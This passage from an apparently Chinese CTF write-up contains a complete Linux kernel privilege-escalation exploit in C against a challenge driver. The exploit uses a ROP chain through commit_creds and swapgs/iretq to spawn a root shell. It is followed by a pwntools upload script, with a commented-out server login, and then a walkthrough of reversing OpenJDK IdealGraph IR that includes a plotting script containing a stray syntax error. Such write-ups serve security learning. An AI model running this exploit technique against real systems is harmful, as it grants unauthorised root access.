    {
        puts(msg);
        exit(-1);
    }
    struct __attribute__((__packed__)) _d
    {
        uint16_t size;
        uint8_t buf[0x100];
        uint64_t rbx;
        uint64_t rbp;
        uint64_t rop[0x100];
    }d;
    /*
    cat /proc/kallsyms | grep proc_ioctl
    commit_creds _copy_from_user
    ffffffffb82909b0
    ffffffff97a909b0
    ffffffff982909b0
    ffffffff9e6909b0
    ffffffff8ea909b0
    ffffffff88e909b0
    ffffffffba2909b0
    */
    uint64_t user_cs, user_ss, user_rflags, user_sp;
    void save_status()
    {
        __asm__("mov user_cs, cs;"
                "mov user_ss, ss;"
                "mov user_sp, rsp;"
                "pushf;"
                "pop user_rflags;"
                );
        puts("[*]status has been saved.");
    }
    void spawn_shell()
    {
        puts("spawn_shell");
        if(!getuid())
        {
            system("/bin/sh");
        }
        else
        {
            puts("[*]spawn shell error!");
        }
        exit(0);
    }
    int main()
    {
        save_status();
        signal(SIGSEGV, spawn_shell);
        int fd;
        fd = open("/proc/chal",0);
        memset(d.buf, 'A', sizeof(d.buf));
        size_t i = 0;
        d.rop[i++] = 0xffffffff81001619; // pop rdi
        d.rop[i++] = 0;
        d.rop[i++] = 0xffffffff81090c20; // prepare_kernel_cred
        d.rop[i++] = 0xffffffff81000210; // mov rdi, rax
        d.rop[i++] = 0xffffffff810909b0; // commit_creds
        d.rop[i++] = 0xffffffff81b66d10; // swapgs
        d.rop[i++] = 0xffffffff8102984b; // iretq
        d.rop[i++] = (uint64_t)spawn_shell;
        d.rop[i++] = user_cs;
        d.rop[i++] = user_rflags;
        d.rop[i++] = user_sp;
        d.rop[i++] = user_ss;
        d.rop[i++] = 0x13372019;
        d.size = 0x110 + i * sizeof(uint64_t);
        puts("exploit!");
        ioctl(fd,0x666,&d);
        return 0;
    }
    int main2(int argc, char const *argv[])
    {
        int fd;
        fd = open("/proc/chal",0);
        memset(d.buf, 'A', sizeof(d.buf));
        size_t i = 0;
        d.size = 0x100;
        puts("exploit!");
        ioctl(fd,0x666,&d);
        return 0;
    }
    from pwn import *
    import base64
    context(log_level='info', arch='amd64')
    BIN = "./fs/exp"
    def exec_cmd(sh, cmd):
        sh.sendline(cmd)
        sh.recvuntil("$ ")
    if __name__ == "__main__":
        # sh = ssh(host="159.75.250.50", user="ctf", password="tctf2021").run("/bin/sh")
        sh = process("./run.sh")
        with open(BIN, "rb") as f:
            data = f.read()
        print("upload")
        # sh.upload_data(data, "/home/ctf/exp")
        total = 0
        while True:
            if len(sh.recvuntil("~ $ ", timeout=5)) == 0:
                print("Root!")
                sh.sendline("cat /dev/sda")
                sh.interactive()
            encoded = base64.b64encode(data)
            once_size = 0x200
            count = 0
            for i in range(0, len(encoded), once_size):
                sh.sendline("echo -n \"%s\" >> benc" % (encoded[i:i+once_size].decode()))
                # print (float(i)/len(encoded))
                count += 1
            sh.sendline("cat benc | base64 -d > exp")
            sh.sendline("chmod +x exp")
            sh.sendline("./exp")
            for i in range(0, count + 2):
                sh.recvuntil("~ $ ")
            total += 1
            print(total)
        # context(log_level='error')
        sh.interactive()
## Reverse
###  bali
一个 Java 的逆向题，但是并没有给 Java 字节码，而是给了 openjdk 的中间语言 IdealGraph 的表示。
大概长这样：
     1874  LoadI  ===  377  1875  1281  [[ 1871 ]]  @int[int:>=0]:exact+any *, idx=6; #int !orig=1288,1127,710,[1171],[967] !jvms: Task::f @ bci:192 (line 25)
     1870  LoadI  ===  377  1871  1283  [[ 1869 ]]  @int[int:>=0]:exact+any *, idx=6; #int !orig=1282,710,[1171],[967] !jvms: Task::f @ bci:192 (line 25)
     1871  StoreI  ===  377  1875  336  1874  [[ 1869  1870 ]]  @int[int:>=0]:exact+any *, idx=6;  Memory: @int[int:20]:NotNull:exact[0] *, idx=6; !orig=1286,1125,729,[1140] !jvms: Task::f @ bci:193 (line 25)
     1868  LoadI  ===  377  1869  1474  [[ 1867 ]]  @int[int:>=0]:exact+any *, idx=6; #int !orig=1568,1315,1127,710,[1171],[967] !jvms: Task::f @ bci:192 (line 25)
IdealGraph 的资料并不太多，可以从 openjdk 的 wiki
找到一点点资料，像[这里](https://wiki.openjdk.java.net/display/HotSpot/C2+IR+Graph+and+Nodes)
有为数不多的总体性资料。
（如果了解 JVM 的 IR 的历史就会知道，事实上 JVM 的 IR 设计（openjdk），也就是 Ideal Graph 的设计和 v8 的 sea
of nodes 是同一个设计者，两者在整体设计上有许多相通之处。）
这个 IR 是一个图结构，每一行对应一个node ，左边是 node 自己的 ID ，”===” 右侧的 3 个数字是 input ，中括号中的是
output 。  
可以从 openjdk
的[源码](https://github.com/openjdk/jdk/tree/master/src/hotspot/share/opto) 找到每一个
node 的具体语义，可以从代码和注释中大概看明白。
然而本体逆向的难点主要在于，整个图结构是比较大的，如果直接看，很难看明白图的结构。好在，高等级版本的 JDK ，IR dump
出来有行数信息，如本题就有，所以可以通过行数信息将每一行拆开来看，这样就可以让逆向的难度稍微降低一点。
具体的每一个 node 的语义就不赘述了，可以通过代码自行看明，这里只简单列举几个重要的点：
  * 类型在 node 里已经指明了，例如 “LoadI” 就是 int 类型
  * 为方便分析，这种 IR 的设计将内存副作用直接表示在了 IR 当中以避免指针分析复杂难做：Load/Store 的节点的输出是一个由该操作进行之后所形成的内存状态。举例来说，Store 节点的参数分别是：”控制流参数，内存状态，地址，值”，例如`Store C, MEM, a+100, 100` （伪代码）得到了一个新的内存状态，在这个状态中，相当于将原来的 `MEM` 状态（初始状态，或是另一个 Store 产生的内存状态）中的 `a+100` 地址对应的值替换为了 100 。这个新的内存状态又可以用于 Store 或是 Load 。通过这样的方式，内存的副作用就完全被涵盖在了 IR 中，可以直接看出，但是对于我们来说，逆向时，错误的内存状态可能导致错误的逆向结果。举例来讲：`a[10] = 200; c = a[10]; a[10] = 100; x = c;` 这时，如果只看语句顺序，在 IR 中，`x = a` 依赖的内存状态是 `c = a` 之前的状态，但是语句顺序却在之后，所以 `x` 应该是 200 而不是 100。（好在，本题里边居然没用到这个点，所以让实际情况变得更简单了）
  * IR 也带有 SSA 的性质，有 Phi node。循环、if 将会生成 Phi node。
  * merge mem其实不管也不怎么影响，还挺复杂的。。。
为逆向方便，我的方法是，按照每一行，将图画出来，这样会得到一个一个的子图，这样一行一行翻译。由于题目本身量比较小，所以这样的方法十分可行。
可视化的脚本如下：
    with open('mylog.txt', 'r') as f:
        content = f.read()
    which_line = 'line 20' # 这里一行一行的修改，开头两行 用 "#" 号注释掉
    graph = []
    def ignore(line):
        included = [
            'Add',
            'Shift',
            'Store',gg
            'Load'
        ]
        equals = []
        return False
        for x in included:
            if x in line:
                return False
        for x in equals:
            if x == line:
                return False
        return True
    table = {}
    for line in content.splitlines():
        if line.startswith('#'):
            continue
        if len(line.strip()) == 0:
            continue
        orig_line = line
        line = line.split(']]')[0]
        part1 = line.split('===')[0]
        print(line)
        part2 = line.split('===')[1]
        num, op = part1.split()
        ins, out = part2.split('[[')
        def to_int(x):
            if x == '_':
                return None
            else:
                return int(x)
        if 'CallStaticJava' in line:
            op = 'CallStaticJava: {}'.format(orig_line.split('#')[1].split('c=')[0])
            part2 = part2.split('(')[0] + part2.split(')')[1]
        ins, out = part2.split('[[')
        if 'returns' in line:
            ins, out = part2.split('[[')[0].split('returns')
        if 'exception' in line:
            ins, out = part2.split('[[')[0].split('exception')
        if 'ConL' in orig_line:
            con_value = orig_line.split('#')[1]
        ins = list(map(to_int, ins.split()))
        out = list(map(to_int, out.split()))
        if ignore(op):
            continue
        table[num] = op
        if 'ConL' in orig_line:
            table[num] = op + ':{}'.format(con_value)
        if not which_line in orig_line:
            continue
        print(orig_line)
        graph.append((num, op, ins, out))
    with open('log.dot', 'w') as f:
        f.write('digraph {')
        printed = []
        for g in graph:
            num, op, ins, out = g
            f.write('{} [label="{} {}"]\n'.format(num, num, op))
            printed.append(num)
        out_printed = []
        for g in graph:
            num, op, ins, out = g
            for o in out:
                if o:
                    f.write('{} -> {};\n'.format(num, o))
                    out_printed.append((num, o))
            for i in ins:
                if i:
                    if not i in printed:
                        f.write('{} [label="{} {}"]\n'.format(i, i, table[str(i)]))
                    if not (i, num) in out_printed:
                        f.write('{} -> {};\n'.format(i, num))
                        out_printed.append((i, num))
        f.write('}')
之后通过 `dot log.dot -Tpng > xx.png` 就可以画出图然后一行一行翻译。
其中比较难的在于两个被 unroll 的循环，由于是常量级的循环（循环的次数固定且不算大），被 unroll
了，如果对优化的算法足够敏感应该能看出来。否则可能会影响一点（会觉得例如 24 行的操作很奇怪，看不懂）。  
如果实在看不出来是循环 unroll 问题其实也不大，按照 addr 的规律一个一个推就好了。这个点好在，因为没有出现之前提到的用 MEM
的状态去确定是哪个变量，所以按照顺序翻译不会出现问题，否则的话翻译过程会复杂不少，需要关注每一个内存状态。
比较可惜的是，由于个人疏忽，将 “-256” 想当然写成了 “256”（0xff），导致这个题本来在第一天基本就做到最后一步的，一直卡住，耽误了大量时间。
最后翻译的结果：
        static boolean f(String inp) { // thread_local + 280
            if (inp != null) {
                if (inp.length() != 21) {
                    return false;
                } else if (!inp.substring(0, 5).equals("0ops{")) {
                    return false;
                } else if (inp.charAt(20) == 125) // 189
                    return false;
                int[] a = new int[20];
                for (int i = 5; i < 20; i++) { // 1027 - 307 loop
                    a[i - 5] = inp.charAt(i);
                }